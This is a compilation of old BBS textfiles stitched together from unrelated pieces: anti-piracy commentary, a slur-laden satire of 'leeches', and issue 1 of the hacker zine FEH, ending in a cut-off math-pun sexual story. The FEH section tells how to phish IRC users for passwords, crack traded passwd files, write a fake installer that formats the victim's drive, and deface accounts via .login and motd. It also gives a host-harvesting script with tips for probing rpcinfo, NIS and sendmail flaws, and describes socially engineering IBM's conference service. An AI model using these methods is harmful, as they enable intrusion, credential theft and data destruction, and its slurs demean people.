 The  first step is to inspire fear  this is achieved right off the bat  with a new user questionnaire threatening denial of access if  caller doesn't provide just the right answers.  And the second is  to force the caller to incriminate himself with his initial  upload.  Once the kid begins downloading and playing commercial  games he could never afford to buy, the pressure cycle of  upload download counts begins.              GENESIS COPIER  super magic drive                          My son is selling his copier for the Genesis for                   275.00  That includes the copier, drive and power                supply.                                                             Little Lulu on the F Net, Pompey Pirates Elite        Conference  While many of the software thieves we've encountered are young,  in their teens and early twenties, others are old enough to be  parents  or even grandparents! .  Few pirate boards have an   educational warez  category in their files areas, so my own  products are rarely found, but parents do download plenty of  games.  I wonder about the children who use the programs that  Dad or Mom has stolen.  Do they know that the program could be  purchased with a manual   Do they learn about hidden features  from friends who have the real thing and then wonder why their  parents never told them they could do that   If and when these  children do learn that Dad has stolen some software they've  enjoyed, do they respect and trust their father less    or do  they simply adopt his dishonest character as their own        Pirating is dishonest.  Honorable people don't do                 dishonest things.  If you want to publicly proclaim your          untrustworthyness  sic , go right ahead.  But don't               expect anyone to ever trust you.  Or respect _your_               rights.

OE leac     Many of you are familiar with  The Real Pirate  volumes 1 4, but some still say we have 5 of them. Most of wich are  Bogus  copies, or immitations of the original.  You also have most likely seen  What Assholes Do , and  AE Assholes , from the Neon Knights.    This will reveal the  Society  of where these little pricks... Leeches ... come from, and hang out.  And what YOUR rank in here is, that is, if you are a leech. This society is almost like the setup of your worst dreaded  Elite Group , at your local Net Works II BBS system.  If I offend anyone, well, then my friend you are a true leech.    Their society is set up like a desperate fight to the top.  Where they want to get higher ranks, the Moles will fight like hell to become an AE Leech.  And the people who have higher ranks will try and make you think they are cool, while spitting on the lower  Leeches , and calling them names, and threats to  Kick their asses!!!!! , threw E Mail.  And the dead give away is that they either spell their handle wrong, or they can't spell  PUSSY  correctly, when calling names. They try  PUSSEY ,  PUSSIE ,  PUSSE , and after a long time get so exasperated, they say  PUSS .  One last note, before the society chart, they will always spell  A LOT  as  ALOT .                                               The society of Leeches is like this                                                    Supreme Leeches                       AE Leeches  BBS Leeches  Assholes                        Un Real Pirates Melvins  But Fucks  Homos                                  11 Year Old Sysops  Fensters Urchins  Flaming BFs  Flaming Homos                                         Moles    Piss Heads  Quibes   Pricks                          Slimes   Scums        9 Year Olds                        Narks     Morons      90 Year Olds                        Goofs   Peons     Hose Heads    Equations work on any example of a leech, these equations can be also applied to Assholes.          Letters typed per minute                                        Molarity    Spelling mistakes per paragraph         Times it says  FUCK  in insult letters                                                  Ignorance Quotient      Times it uses multiple  !  after a verb        Times it uses  U  for  you  per paragraph                                                     Grey Cell Count      Times it uses  4  for  for  per paragraph     Leeches have their own type of linguistics, telling each other they are better then the other. And to not  MESS  with them, or they shall  KICK YOUR FUCKING ASS!!!! .  For example, their numbering system          I     1              2     or  I    3        IV    4   From then  IV  on, they use normal Arabic numerals, or even invent their own ways of numbering, such as  FV  5,  SX  6, and  ATE  8.       Leeches also have their own types of sayings like  K K00L   Refering to how much they like somthing, like  K K00L WAREZ!  WAREZ    Refering to their new software games 2        Refering to the word  TWO ,  TO , and  TOO  4        Refering to the word  FOR  or  FOUR , but they will usually use  IV  L8TR     Telling the person that they will see him at a later date C00L     A mellow leech, who has'nt cought onto the saying  K K00L  yet RAD      Refering to how interesting, or neat somthing is, like  RAD WAREZ  HACKZ    Refering to the latest MCI access codes, because they used theirs up KRACK    Somthing they can't do, however, they say they can, that is DOS BOSS DUDEZ    Refering to the plural form of  DUDE , which means no god damn thing!  !!!!    Expressing an action.  Like  FUCK U!!!!!!! .  No less then five  ! 's    Leeches have been known to tie their sayings together, like  K K00L RAD WAREZ!!!!! , this ties four of thier sayings together at once.  That is yet another way they show off their rank in th society, in the never ending struggle to become  Supreme Leech .    Where do leeches come from   They come pretty much from Connecticut, New York, and New Jersey.  With New York, and Connecticut being the worst of all areas for  Leech  infestation.  I am not saying all people from those areas are leeches, most of the best BBS' are located in New York.  This does not mean they are confined to these areas.  Leeches are a wide spread species, and come from all over the US, even from Montana.       The leeches will always cause such things as     Making the local Greene Machine TRS 80 BBS be busy from 3 30 PM to 10 30 PM. Why   Because thats the time when they get home from school, and the time they go to bed with their Teddy Bear, and play  Smack Dong .    Making the AE lines busy.  They make the AE lines busy, they call when they get home, they call from school, they call in the morning, they call Friday nights, they call on the weekends  24 Hours a day .  They call from the dead of night to get one thing  K K00L WAREZ .  Never uploading.    Making MCI extenders busy 24 hours a day.  Especially when they get home from school, they get some milk and cookies, and start phreaking local calls to the Net Works II hangout.    You can find these little guys on all Net Works II BBS systems.  No T Net systems, because they can't handle 100 lines, and 80 columns to post messages with.  I personally can say  ALL  Net Works II BBS systems.  Some might be worse then others, but all have them.    How can you find one   You can find them by going to the Trading board, and look for such titles as  NEW WAEZ!!! ,   APPLE TRADE  , or      C00L N WAREZ     .  Once you locate such a title, read the bulletin, you will see somthing like this    BULLETIN  69 TITLE      APPLE TRADEZ     POSTED BY  LORD SAURON DATE POSTED   1 25 85     ANY OF U DUDEZ WANT 2 TRADE 4 SOME C00L NEW WAREZ   I HAVE SEVEREL NEW ONEZ   RESCUE RAIDERS KARATEKA PIT STOP    NEWSROOM     OK SPACE SHUTTLE ARCHON        I AM GETTING SOME NEW 1'Z SOON, FROM MY FRIEND IN CALIFORNIA.  SO LOOK 4 MORE SOON.     LEAVE E MAIL 2     F  LORD   L  SAURON  P.S.  DOES ANYONE HAVE DUNG BEATLES YET         L8TR          LORD SAURON               ELECTORO ELITE        PRES. OF MAP     What gives this man  If I could be so descript  away from the start  First,  Lord Sauron , sounds like some ruler from Europe during the 13th century. First line, he uses the words  YOU  as  U , and  TO  as  2 , and  4  for  FOR . His then uses  0  for  O  in the second sentence, in describing how cold his new software is.  He uses the term  WAREZ  in meaning software diskettes. Misspells  SEVERAL  as  SEVEREL , then uses a  Z  for a  S  in  ONES .  Then lists out all of his  C00L NEW WAREZ  in a well organized list, and makes a comment about one.  Then Lord Sauron uses  1'Z  for the word  ONES , trying to fool us with his quick wit.  As always, he will go into how he has connections in California. If every leech I have seen use this message actually has a relative in Califoria, California would be one huge leech pile.  Lord Sauron then tells us what his first and last name is, as if we can not split it our selves.   Notice he does this every place he goes, even T Net systems, where you don't have to split a person's name.  Assuming all BBS' are run on Net Works II, where you have to split names .  He then blows all of us away with  Does any one have dung beatles  , because that was released in what  1979 . Lord Sauron again shows us his quick wit, in combining numbers with letters, and says  L8TR , meaning of course  LATER , in refering to a future act.  Now our old Lord Sauron is getting tired of typing, he has been going at it for atleast 25 minutes now. He signs off, using text graphics, and telling us two associations he belongs too.   Electoro Elite , and  President of MAP .    What goes on in this poor fellows mind.  Does he think we actually care what group, if any, he belongs to   Does he think we will kiss his feet, because he uses  as the leeches say   K K00L T GRAPHS  when signing all of his letters  Lord Sauron is definately a  Net Works II Rat , he seperates his name into two words for you, he types in all UPPER case, and has a logic seaker built in that tells him, when he hits 40 columns, he has to hit carriage return, or he will not see his typing.  Lord Sauron made a total of 22 errors in his message for traders.  And 22 is a small number, compared to the Suprem Leeches.  Who can wing about 30 or 40 errors in a message.    On the other hand, leeches don't always post, theq just read.  These are the wimpy leeches, and the real mental midgets of the leech society.    Then comes the stupid shit leech, who wonders why he can't download the latest  K K00L WARE  from a CAT SEND line, using Smartcom 1, and a Hayes Micro Modem IIe.    Of course, we have smart leeches, who read books like,  The Third Rich , and  Websters Dictionary .  The smart ones always back up such software as Dung Beatles.    We have the scum variety of leeches who think that is they get enough dirt on them, they can look like an India, and take a magic marker to their fore head, and put a black mark.  So they can really look like an Indian.    We have the Mole variety of leeches, who are afraid of people's dogs, cat, birds, and fish.    We have the nervous, and jerky leeches, who will be so tense, that if somthing goes wrong, their heads will split in half!    The society of leeches is an never ending story.  We have so many types of leeches.  Some day these little guys will grow up, and run our nation. Take Walter Mondale for instance, if he was a computer user, would he be considered a leech   Let me phrase it in another way, does a cow shit in a field         I leave you on two very famous quotes from Supreme Leeches    Who is on Milliways   I bet it's a leech!!!  He Yuk..He Yuk..He Yuk...     Don't call us, we will call you!      I would personally like to thank      for some help, and The Vigilante for his input, however small it may have been, I am still thankfull.

TO WRITE A T FILE, YOU NEED THESE THINGS   1.  YOU NEED AN APPLE   E OR   C WITH UPPER   LOWER CASE...      USING A II  IS REALLY A PAIN.   AN APPLE ISN'T NECESSARY, BUT REAL     TEXTFILE WRITERS DONT USE ANYTHING BUT THE BEST...  2.  YOU NEED AN 80 COLUMN CARD.  3.  YOU NEED THE ABILITY TO STRETCH OUT WHAT YOU ARE TRYING TO SAY SO THAT     THE FILE TAKES LONGER TO V IEW AND TAKES UP MORE DISK SPACE.  A TEXTFILE     SHOULD BE AT LEAST 15 SECTORS, BUT ITS BEST IF ITS OVER 20.     EXAMPLE         YOU WANT TO SAY     WRITING T FILES IS A PAIN...        IN A T FILE YOU WOULD SAY IT LIKE THIS     WRITING A TEXTFILE IS A VERY TIME CONSUMING AND ARDUOUS TASK.    IT TAKES A LOT OF THOUGHT AND IS VERY WEARING ON A PERSON.  IT    IS NOT AT ALL EASY.       AND THEN YOU ELABORATE ON WHAT YOU JUST SAID.  4.  YOU NEED THE ABILITY TO LOOK AT THE SCREEN AND KNOW EXACTLY WHERE THE     CENTER IS SO THAT YOU CAN CENTER GARBAGE.     EX.             VVVVVVVVV                GARBAGE                                 I DON'T HAVE THAT ABILITY, BUT SOMETIMES I GET LUCKY.  5.  YOU NEED TO THE ABILITY TO MIX DIFFERENT CHARACTERS IN AN APPEALLING     WAY TO MAKE A BORDER FOR THE TITLE.     EX.                                       HELLO            HELLO                                                                 HELLO                              L   THE LOCKSMITH   S    V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V V     AND STUFF LIKE THAT.  THERE ARE A LOT MORE, BUT THEY'RE HARD TO MAKE     ON AN APPLE II  SINCE A II  DOESN'T HAVE ALL THE CHARATERS ON THE     KEYBOARD.  6.  YOU HAVE TO HAVE A LOT OF PATIEN CE.  YOU HAVE TO BE ABLE TO TYPE FOR     HOURS AT A TIME.  IF YOU TYPE FAST ENOUGH, YOU DON'T HAVE TO WORRY     ABOUT THIS STEP.  7.  IT HELPS IF YOU ARE ONE OF THE NEON KNIGHTS     OF METALAND.         THOSE GUYS WRITE THE BEST T FILES      8.  ITS HELPFUL TO HAVE A GOOD WORD PROCESSOR, BUT AE WILL DO THE JOB GOOD     ENOUGH.  AE HAS ONE OF THE BEST TEXT EDITORS.  9.  IT HELPS A LOT IF YOU ARE DRUNK AND TO HAVE MUSIC BLASTING IN YOUR EARS     IN STEREO. I DON'T KNOW WHY, BUT THATS JUST THE WAY IT WORKS.       WRITE A TEXT FILE AND GIVE IT TO SOMEONE ELSE WITH A MODEM, BUT THATS     KIND OF A PAIN.     NOW HERE IS A LIST OF NON NECESSITIES    1.

YOU DON'T NEED TO KNOW ANYTHING ABOUT WHAT YOU ARE WRITING YOUR TEXTFILE     ABOUT IF YOU CAN MAKE IT UP AS YOU GO ALONG.  4.  YOU DON'T NEED TO BE A  REAL PIRATE , BUT IT HELPS.

The first issue of FEH, a 'zine in its incarnation already famous and destined for greatness.  Richard Steele, ex cia agent, says of FEH,  my penis is HUGE .  While I'm not sure exactly how this relates to FEH, he IS ex cia, so we better publish whatever he says.  Erik Bloodaxe, aka Chris G., when asked about the prospects of facing a FEH issue against Phrack, exclaimed  dude, i own you.  i mean, we're all running yer scripts anyhow.    Grayarea, publisher of, oddly enough, grayareas, wrote about our release,  spell it Gray Areas.   Perhaps most impressive of all, Emmanuel Goldstein, when faced with the certain demise of 2600 given FEH's release, commented  will you leave me alone if i give you a quote    And so, without further adieu, I present to you, FEH  1.

Editorial  Too many people that are in the 'scene' today seem to do nothing but hoarde things.  Send me this, gimme this seems to be the prevailing attitude of the day.  If you are going to get on the net and try to hoarde anything, make it knowledge.  Spend your time learning instead of trying to get toolz out of people and figuring out who the newest irc chick is.  Sometimes that means talking to people on irc, but most of the time that means getting out there and doing it yourself.  Its fine if you want to do the whole social scene of hacking or phreaking or warez or ansi, they are all different but in essence, they are all about entertainment on IRC.  But at the heart of them is a common goal, why which ultimately people are judged.  Which of these groups have the purest goals   To have all the warez   To make the coolest ansi or demo   To setup a conf   No, its knowledge.  And that's why we are fuxin' eleet hackers.  And that is our ideal.  Now, you may see us on  hack 24 hours a day, but trust me, we idle a lot, and despite the  fact that we may be active in the 'social scene' of hacking, it is what we are doing in another window while the irc screen scrolls that makes us fuxin' eleet, not what we do on IRC.                                             All the members of FEH       4.   var spool mail feh  Someone sent this to one of the FEH members, anonymously, so we dunno where it came from or who wrote it.  The names were removed to protect the obviously guilty...  Most of the stuff is from my latest performance report.  Prior to that I worked in the Computer Security Branch as the Virus Pc expert.  In that capacity I was responsible for taking care of any and all problems concerning viruses and P.C.s.  I was taken from a shop where I was doing communications security due to my extensive knowledge of p.c.s and my decent programming skills.  They needed someone with some knowledge and foundation in taking care of Personal Computers.  I established a base line program for dealing with computer viruses, handling copyright issues and dealing with user  problems associated with Personal Computers.  We were having some difficulty with users not being able to distinguish between viruses and program  gliches due to software problems.  That's where I came in.  O.k. from there they figured out that I am very good with computers.  They needed someone to handle Network Security who could do tiger team actions and monitor our  networks.  They felt due to my computer knowledge I would be the most viable candidate.  The following is directly from my performance report.   Expert in all aspects of Wide Area Network WAN  security support.   Responsible for executing all portions of periodic system security audits  to find and correct host security vulnerablilities.  Assists HQ USAF Local Area Network  LAN  systems administrators and customers in implementation of security safeguards on all UNIX hosts.  Proactively analyzes Network  Security Monitors  NSM  logs for indications of attempted or successful intrusions.  Systems administrator for DSST SPARC station platforms.    Heart of the agency's newly established wide area network security program. Developed and documented procedures for monitoring the HQUSAF backbone. Security program has led to the most protected network within the DOD  rated by the Defense Information Systems Security Agency as the best of 9000 systems audited by its elite Center for information Security. Performs aggressive quarterly security audits of the HQ USAF WAN. Created software tools and new hacking techniques used by the Air Force  Information Warfare Center for their on line surveys of worldwide sites. Resident expert on UNIX security. Trained counterparts throughout the agency on our methodology enabling  them to secure their networks. Regularly called upon by outside agencies for assistance. Expertise passed to other system administrators through articles published in directorate's security newsletter.    leader who has brought the agency's network security program from the  infancy stage to a mature sustainable program which has Air Force wide recognition. Knowledge of UNIX security and leading edge hacking techniques makes him  a valued source of information thoughout DOD.        5.

Fuxin' Eleet Haxor Logs by Hotrod  As an offering to the public to prove FEH's obvious superiority to l0ck,  I decided to demonstrate a n00 h4q t3kn1qu3 recently developed in the FEH  laboratories, located on a secret island in the Atlantic ocean.  The n00 h4q t3kn1qu3 has been demonstrated on wopr.mil, once regarded as  one of the most secure machines on the net.  This machine alone  determines whether or not to launch the nuclear missles of the United  States.  It runs on the US Military's top secret propriatary OS  Lesb OS .   Lesb OS machines are no match for the awesome power of FEH.

So I investigated how IBM teleconfs are setup, who makes them with  what software, and how to access IBM conferences.  Well I called up IBM's toll free  information  line  available  from the 800  index and began a very blunt attempt to socially engineer teleconfs from IBM. The guy I talked to with told me to work through my  regional  directors, not through the software information  line, and he gave me the number to American Teleconferencing  Service,  which  exclusivly handles IBM extrenal teleconfs. American  is  a  southern  company, located in Tousan, AZ.   This was originally designed  as  a scam article, a step by step guide to the tricks  and  traps  involved with setting up American Teleconferences through IBM. Upon  further  consideration, I went back and edited the article to make it more informational and less  LeT'z HaCk Th0sE FuCkeRz!  I am sure that the rewording of this  paper  will not make fraudulent use of the information any less compelling, but I do feel sure that half assed phreakers would be better off sticking with old AT T.  ed note    i wish he just gave us codes, all this technical stuff makes my head hurt.                                           A look at an American Teleconfernce                                         American Teleconferences conference setup looks like this                                                  6500800   TiNet Dialin   Accessible to IBM and not you.    7194440800   External Dialin   Regular Telephone number.    157998   Conference ID   Use this to access account and conference.                                              Also, American teleconference offers an optional toll free line to dial in to the conference. This is the only option they offer for external access to the conferences.  TiNet  works  from probably all IBM phone lines, by dialing 271 followed by the TiNet number.  American works on a fairly primitive conferencing system, they simply connect each line to the other lines as they call in. There is no  conference hub, so if you're the first caller, you get put on hold until the  next  caller comes in. The music sucks, i mean, this is really terrible music.  ed note  you might like the music, some people set these confs up themselves           just so they can hear the hold music, and nobody ever calls.    An automated conference conection does not exist, and there is no real access code  to  enter.  Once  you  dial into the conference, you are greeted by the operator  who  asks you for you conference ID number and your name. A list of names can be generated and given to the operator before the conference.                               How American Operates                              All  IBM  groups  that  use  American  have  files  in  American's Databases. Contained in your file  is  your  name,  title, office phone, office address, which  will also be your billing address, and your department number. This is an example of  what the file would look like when brought up on their screen                                           Name   Bruce Sterling       Hi Bruce   Dpt      5176              from the last 4 digits of phone number   Addr   227 Maple Lane       Office adress   billing adress   Addr   Phila PA 19191       Use the closest corp office   Phon   512 323 5176         Office Numba   XXXX   Billed 1 11 11  status          Did yew pay your bills    XXXX   Billed 1 11 11  status       XXXX    Notes        He writes books                                             This is certainly  not  a screen capture, so the screen the operator will see is very probably more  complex. Also the Fields represent variable areas, you probably get a  better  idea of what the operator is thinking when talking to you through this.  ed note  the operator is probably thinking about how her life ended up           so miserably that she is working as a telephone operator.   Billing  status  can include a refuse notice for delayed payment or whatever. The Notes can  be preferences, such as toll free access or possibly something else. Callback  confirmation  is  usually not utilized, since the bill is not included with the  phone  bill, but is delivered to the billing address. Your  number appears  on their terminal  also,  with whatever comments are attached to that.  American has become so exclusively  dedicated  to  serving IBM that operators will sometimes get on and  say  IBM Conference Service.  I also spoke to some  operators about what software they were running and on what type of terminals which appears to be a big secret.   ed note  probably NOT os 2  EDICTS  Electronic Distribution Information  Control Transaction System, file  transfer  system. Operates RO6000 Systems. Distributed by IBM. This is one of the programs used by American, the operator told me that much before she woke up a bit. This is a datacommunications software package, and is seperate from their audio   video teleconferencing software.                                      TiNet, TiLines, and TiSystems                                     TiNet dialins do not exist. The only  way to access TiNet Services is through IBM's phone system. TiNet is simply the  telephone system IBM strung together which makes conferencing and interoffice communications easier.  In fact, TiNet was  created as a datacommunications system that ended up with a gross excess of bandwith so they expanded  into Voice Capabilities. TiLines can be setup in virtually any office, and for any large bussiness.  Tinet's selling feature, so to  speak, is that offices with TiLines installed can bypass long distance  charges and  Telephone Companies all together. This is particularly  useful  for Banks and  Credit Unions who prefer the Security of private phone lines than the inherent lack of security in public   normal phone lines.  ed note  what about clipper    In conclusion I would  like to state that all of the information mentioned is for purely  informational  purposes and that, should any of you abuse IBM and American Teleconferencing, that would be illegal and you would be prosecuted. But then again, would any of us choose to break the law  Heavens no!   ed note  if you do happen to break the law, drop us a note so we know that           this is useful.

How to amuse yourself by Rush2   ed note  this is what people that are not FEH might try   1. The Michael scam.  One day a few days ago I got very very bored. I said   what the hell. I bet I can get a lamer to give me his her password. I  thought of the most common name, michael, and changed my irc nick to .. DUH  Michael.. within 10 minutes someone had mistaken me for her best friend   michael..  she thanked me for somethign about hooking her up with alliance  not the service, some guy.  I bullshitted for 10 minutes, then really panick  y like  Oh crap I just screwed up my account.. majorly would you gime your   login and password pleaseeeee .  Wellshe was that stupid and she gave it to  me. I really wanted to know if anyone else was that stupid.  I tried a lot  of common names for the next 2 hours, john, mike, larry etc..etc.. I   succeeded wiht 99  of my attempts, I got 19, failed once. SO do something  like this if you are REALLY bored.   ed note  a bottle of scotch is far more effective than this    2. Trade passwd files.. hehe... when your bored change yer name on irc,  go into  Hack see if you dont get kicked off and ask for passwd files..   ed note  if you don't get kicked off, hurt everyone that was opped    if you are really bored this can be fun and you can get some new systems  to get in.. now unless your someone that is cracking them just to get as   many accounts as you can  I feel hypocritical currently I have 1400 valid  accounts on this local provider, on my computer upstairs  in just one day   YES people in my area have easy passwds.. only a 1mb file  AND just with   login name I got 300 yesterday.. haha I  And I am hearing a lot of beeps   root was the first cracked account  .. this is something to do if you  feel bored and lame...  ed note  mail the cracked password file to cert cert.org and you win a prize   3. Write really nifty little utils in quick basic  if your still stuck  on a dos box ... nothing is niftier than writing a shitty program in  qbasic that uses a captured installation display screen from a game   or something  or modify it to say mortal combat 3 or soemthing, the little  warez kids cum from this  and really make it format their drive... yes this  is lame but you KNOW we all get this bored at one time or another in our   lives.  ed note  Super Street Fighter is more Fuxin' Eleet    4.

Yes  ansi  people with any intelligence know it is american national standards institute,  dorky little kids that have no life  we have no lives either but we arent   little kids ... we are middle kids..     ed note  if anyone can figure out  what the hell he is talking about, email me  think it is an art form and a way  for them to be cool... their idea of coolness is being worshipped by pervert  ed, immature, talentless, dweebs with pcs.. most of these peopel are aol  and prodigy rejects... ...anyways... this is something to do when you are   SUICIDALLY bored.  ed note  actually suicide might be a better solution   5. Get on one off those cracked accounts  see number 1  and type something   like archie  s a   hackedpws.k00l  or archie  s .   HEY.YOU.STUPID.SYSADMIN.  BLOW.ME  that is sure to get his attention .  If you are really bored, you   can edit their .login to cat the file when they login  this being archying    sp  a or . will probably give you a few thousand file names and if the owner  of the account can even login  they havent checked user quotas yet obviously   so that they must wait an hour for the thing to finish  but I'm not sure it   never has for me because i just telnet , it may just flood their com ports    or if you have root, do archie  s a, archie  s ., archie  s  whatever you   want to to get a LOT of entries    motd or  .login and make it so EVERY  ONE sees this when they login...  unless they are on like a 2400...

The Infamous Tack Story by Hotrod  The story you are about to hear, it has been determined, has been spread  by word of mouth to at least 5 states, and parts of Canada.  Whereever I  go, people who I have never seen before ask me about the tack story. I    have no idea why this is the case   the story might have been funny once, but I'm really rather sick of it.  My friends  and apparantly these  people I don't know, who ask me about it  think this story is the  funniest thing they've ever heard.  I think they are nuts.  The following story is 100  true. Dramatis Personae  Myself  Hotrod  Chris, A friend Zafir, An acquaintance  ed note  is he the pan flute dude    The Setting  Junior High School, Massachusetts. Lunchtime, 8th grade  Ok, here goes.  It was a normal lunchtime, really.  I had gotten in line  to get the  Hot Lunch , which is the generic,  nutritionally balanced   meal.  On this fateful day, the hot lunch was manicotti with meat sauce. A kid I knew, and had no reason to distrust, came up to me while I was in  line and offered to sell me his hot lunch, without the milk.  Milk came  with the hot lunch.   Of course, I'm thinking to myself  This kid must be  stupid.  He wants to sell me his hot lunch, which costs  1.30, for 50  cents, while keeping his milk, which he could have bought for 35 cents by  itself.  ed note  a savings of  45 cents   I did know that this kid WAS stupid, however.  So I bought the lunch and went to sit where I always sat, next to my friend Chris.  ed note  not erikb  For a few minutes, everything was fine.  I was eating and enjoying  as  much as one can enjoy a school lunch, anyhow  my manicotti.  Keep in  mind, that manicotti is soft, it's something like lasagna.   ed note  i hope nobody from Italy is reading this   You don't really chew it a whole lot, you just squish it around in your mouth and swallow.  Then it happened.  I put the manicotti into my mouth.   ed note  that's not the climax of the story, he in fact put many pieces of manicotti in his mouth that day   I squished.  I swallowed.  I grunted.  I yelled. Something Sharp! Words that will live in infamy in the minds of my friends.  ed note  the words 'huuhuhuhhuhu' also live in infamy to his friends  The dialogue went like this  Me   In a very hoarse voice    Argh !   Something Sharp!  Something sharp                                 in my throat!   Chris   What    ed note  still not goggans  Me   Argh it kills!  Chris   What is it    ed note  this time it is erikb saying it  Me   Grabbing Chris' chocolate milk and taking a swig   I can feel it  like grinding down my throat.. You know when you get like the sharp  corner of a Dorito or something   God it kills!  It feels like a staple  or a tack or something!  Chris   Laughing a bit   A tack   Zafir probably put a tack in it!   ed note  being a minor, Zafir was out of jail on his 18th birthday    Anyhow, thats about it.  It hurt going down.  It never hurt again. To the best of my knowledge, I have not shit out the 'tack'.  No proof has ever been found that there was a tack in my manicotti,  ed note  manicotti in general should not hurt to swallow  although Chris swears that he talked to  Zafir, and Zafir admitted to it.  I think Zafir has since been deported.   I hope so, anyhow.  Should I ever shit the tack out, it will be so noted in a future issue of FEH.  ed note  I have a pencil end in my right shoulder        11.

WELCOME TO  name witheld , NOW OWNED BY FEH            TODAY'S NEWS  Your system has been hacked by a member of FEH... Fuxin Eleet Haxors. I am not particularly proud of this hack because it exploited an extremely old bug that was patched many years ago. I have left a file in the root directory called  how.to.fix.the.bugs.you.have  please read it and follow the directions in it on how to fix the bugs you have. I am very sure that your system has many bugs, judging from this and the version of sendmail you are running.  Thank you for your time...     Anonymous member of FEH who just fuxored up your system real bad Not exactly beautiful, but it worked for the site it was placed on.   ReD then created the FEH motd versions 1.0 and 1.1, which is located in this issue within the wopr hack.  ed note   oof never got his warez, if you have any, please send him some         12.  An Interview with Dale Drew by ReDragon  ed note  good to my word, this is completely unedited for content, only for formatting.       ReD   will you do an interview for FEH issue  1  d_d   I dont do interviews, sorry ReD   just this once dale.  only a few questions ReD   its not like you've NEVER done an interview ReD   dont even think of it as an interview, think of it as just       answering a few questions where the answers get published d_d   haha.. and the difference is  ReD   well, you dont do interviews.  but maybe you do published question       and answer sessions. ReD   so why dont you do interviews  d_d   Youve got better things to do than interview me ReD   when you let me interview you, you keep me out of trouble    ReD   so why dont you do interviews  ReD   well d_d   too many misquotes ReD   pleez ReD   i am not going to misquote you ReD   so will you answer just a few questions for me d_d   depends on the questions ReD   are there any hackers that you particularly like or dislike  d_d   No. ReD   Do you think the people you are trying to bust care about learning         about the phone system or are they just trying to make free phone       calls  d_d   There are to many LEGAL ways to learn about phone systems these days       to put up with fraud. ReD   So do you think 10 or 20 years ago some phreaking may have been        justified in order to learn  d_d   I never think that committing fraud is a justifiable way to learn       anything. ReD   Does it cost your company anything when a person makes a free phone call  d_d   Making use of a service illegally that would otherwise be billed       for certainly costs the company money ReD   I understand there is a loss of income from the consumer since they are       not paying, but is there any expense to the phone company for that call       and if so can you estimate the cost  d_d   I am not in phone fraud, so I wouldnt be able to estimate ReD   So what is your job description  d_d   Data Security ReD   Can you expand on what that encompasses  d_d   Later.. Ill be back ReD   do you know when   d_d drops connection        13.   Hacking Made Easy Using Scripts  by Seven Eleven  HacK1nG Mad3 EZ Uz1Ng Skr1PtZ    Part I  by Seven Eleven  711 sec.de                                           Welcome to our new column, dear reader.  In the software industry, everything is getting easier    easier to use, easier to handle. The keywords are  Plug and Play , the new WinDos 95 and  Don't think but drive  on the information superhighway  .  Now everyone can get on the Internet, your grandfather, your 4 year old sister and even a coffee machine in Cambridge. There is no need to be smart, no need to know anything about computers, and no need to have a brain.  With more and more people on the net, more and more want to play around and learn about other systems by getting into them, formerly called  Hacking .  To make those tries possible, we are bringing you easy to use and always  working step by step instructions and scripts!  There are 3 major steps to succeed, which are similar to hitting on a girl   1  Get a list of all visible targets 2  Check if there is an easy way of scoring 3  Try gettin' into!  Today we will take a look at 1  and 2 . 3  will follow in the next issue.  Since all most newsbies know about is IRC, we will try to get a list of visible targets through IRC!  Here is our great script                      cut here                             cut here             IRC Host Leecher 1.0 by Seven Eleven  711 sec.de      This little one liner gets you all hosts that are currently on IRC   and sorts the output nicely.     This is especially nice if you plan to use our Host Checker.       All you have to do is this      Start IRC    SET LOGFILE rawhosts    SET LOG ON    WHO       SET LOG OFF    QUIT      Name_of_this_Script  rawhosts   outputfile     Have Fun!          ! bin sh cat  1   awk ' print  4 '   awk  F  ' print  2 '   sort   uniq                cut here                       cut here                        Also try to use an old or modified server that won't kill you when you list too many names! It used to be easier some months ago, but you should still be lucky! After all, it's good if not too many Lamers get as far as you, isn't it       If everything went fine, you have a wonderfully nice list of hostnames.  If you want to do it the elite way, try writing your own elite script, executing a command with each of the hostnames. Possibilities include     Check with rpcinfo  p which services are available.    Some might be vulnerable!    One vulnerable daemon is mountd. Figure out yourself how to probe it!    First Exercise!     Use ypx or ypsnarf to test their ypserver's security. If it's open,   either get in or     social engineer the admin by telling him bugs  lame!     Check with the 31337 SATAN!    available at a WaR3z near you!     Try some sendmail bugs.   If the above ways sound to hard for you, do it the easy way. Social engineer the administrators!    Sending mail to root hostname requesting for an account    Be prepared for many flames and your old account to be shut down    If you should surprisingly be successful, drop me a mail and tell me about your story! If not, stay tuned for the next issue of... HacK1nG Mad3 EZ Uz1Ng Skr1PtZ!         14.

Once upon a time  1 t  pretty little Polly Nomial was strolling across a field of vectors when she came to the boundary of a singularly large matrix. Now Polly was convergent, and her mother had made it an absolute condition that she must never enter such an array without her brackets on. Polly, however, who had changed her variables that morning and was feeling particularly badly behaved, ignored this condition on the basis that it was insufficient and made her way in amongst the complex elements. Rows and columns closed in on her from all sides. Tangents approached her surface. She became tensor and tensor. Quite suddendly two branches of a hyperbola touched her at a single point. She oscillated violently, lost all sense of directrix, and went completely divergent. As she tripped over a square root that was protruding from the erf and plunged headlong down a steep gradient. When she rounded off once more, she found herself inverted, apparently alone, in a non Euclidean space.      She was being watched, however. That smooth operator, Curly Pi, was lurking inner product. As his eyes devoured her curvilinear coordinates, a singular expression crossed his face. He wondered,  Was she still convergent   He decided to integrate properly at once.      Hearing a common fraction behind her, Polly rotated and saw Curly Pi approaching with his power series extrapolated. She could see at once by his degenerate conic and dissipative that he was bent on no good.       Arcsinh,  she gasped.       Ho, ho,  he said,  What a symmetric little asymptote you have I can see you angles have lots of secs.        Oh sir,  she protested,  keep away from me I haven't got my brackets on.        Calm yourself, my dear,  said our suave operator,  your fears are purely imaginary.        I, I,  she thought,  perhaps he's not normal but homologous.        What order are you   the brute demanded.       Seventeen,  replied Polly.      Curly leered  I suppose you've never been operated on.        Of course not,  Polly replied quite properly,  I'm absolutely convergent.        Come, come,  said Curly,  let's off to a decimal place I know and I'll take you to the limit.        Never,  gasped Polly.       Abscissa,  he swore, using the vilest oath he knew. His patience was gone. Coshing her over the coefficient with a log until she was powerless, Curly removed her discontinuities. He stared at her significant places, and began smoothing out her points of inflection. Poor Polly. The algorithmic method was now her only hope. She felt his digits tending to her asymptotic limit. Her convergence would soon be gone forever.      There was no mercy, for Curly was a heavyside operator. Curly's radius squared itself  Polly's loci quivered. He integrated by parts. He integrated by partial fractions. After he cofactored, he performed runge   kutta on her. The complex beast even went all the way around and did a contour integration. What an indignity   to be multiply connected on her first integration. Curly went on operating until he completely satisfied her hypothesis, then he exponentiated and became completely orthogonal.      When Polly got home that night, her mother noticed that she was no longer piecewise continuous, but had been 